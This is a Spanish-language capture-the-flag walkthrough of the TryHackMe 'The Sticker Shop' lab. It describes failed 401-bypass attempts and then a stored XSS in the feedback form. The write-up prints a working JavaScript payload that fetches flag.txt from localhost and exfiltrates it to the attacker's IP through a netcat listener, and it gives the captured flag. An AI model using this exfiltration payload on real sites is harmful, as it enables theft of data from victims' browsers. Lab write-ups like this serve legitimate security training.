## The Sticker Shop

Este walkthrough describe el proceso para vulnerar una máquina en TryHackMe, identificando vulnerabilidades en una página web de stickers de gato y explotándolas para extraer la flag oculta.

## Paso 1: Exploración Inicial

Al acceder a la página web, encontramos dos pestañas principales:

- **Home**

![](the%20sticker%20shop%20(1).png)

- **Feedback**

![](the%20sticker%20shop%20(2).png)

La premisa inicial de TryHackMe nos proporciona la URL donde se encuentra la flag:

```
http://10.10.167.141:8080/flag.txt
```
![](the%20sticker%20shop%20(3).png)


## Paso 2: Intento de Bypass 401

Se intenta acceder a la flag directamente, pero nos encontramos con una autenticación 401. Se prueban diversos métodos de bypass de 401, incluyendo variaciones en la URL como:

```
http://10.10.167.141:8080/FLAG.txt
http://10.10.167.141:8080/Flag.Txt
```

Sin embargo, todos estos intentos resultan en errores 404 o 405, lo que hace imposible realizar el bypass por este método.

![](the%20sticker%20shop%20(4).png)
## Paso 3: Exploración de Feedback y Pruebas de XSS

En la pestaña **Feedback**, encontramos un cuadro de texto donde podemos ingresar datos. Se realizan pruebas de inyección de script, pero la inyección básica:

```
<script>alert(1)</script>
```

No genera ningún resultado. Antes de probar otros métodos, intentamos lo siguiente:

```
<script src="http://10.6.17.22:1234/"></script>
```

Con un listener activo en nuestra máquina:

```
nc -lvnp 1234
```

Obtenemos la siguiente respuesta:

```
listening on [any] 1234 ...
connect to [10.6.17.22] from (UNKNOWN) [10.10.167.141] 49642
GET / HTTP/1.1
Host: 10.6.17.22:1234
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/119.0.6045.105 Safari/537.36
Accept: */*
Referer: http://127.0.0.1:8080/
Accept-Encoding: gzip, deflate
```

Esto confirma que la inyección de script está funcionando.

## Paso 4: Explotación de XSS para Obtener la Flag

Sabemos que podemos ejecutar JavaScript dentro del navegador de la víctima. Procedemos con la siguiente consulta para extraer la flag:

```
<script>
  fetch('http://127.0.0.1:8080/flag.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://10.6.17.22:1234/?data=' + encodeURIComponent(data))
    })
    .catch(err => console.error(err));
</script>
```

Dejamos escuchando nuestro listener y recibimos la siguiente respuesta:

```
GET /?data=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D HTTP/1.1
Host: 10.6.17.22:1234
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/119.0.6045.105 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:8080
Referer: http://127.0.0.1:8080/
Accept-Encoding: gzip, deflate
```

## Paso 5: Decodificación de la Flag

La flag obtenida está en formato URL-encoded:

```
THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D
```

Al decodificarla, obtenemos la flag final:

```
THM{83789a69074f636f64a38879cfcabe8b62305ee6}
```

## Conclusión

Se ha vulnerado exitosamente la máquina explotando una inyección de JavaScript en la funcionalidad de **Feedback**, lo que permitió extraer la flag desde `flag.txt` en el servidor. Esto demuestra la importancia de mitigar ataques de XSS en aplicaciones web.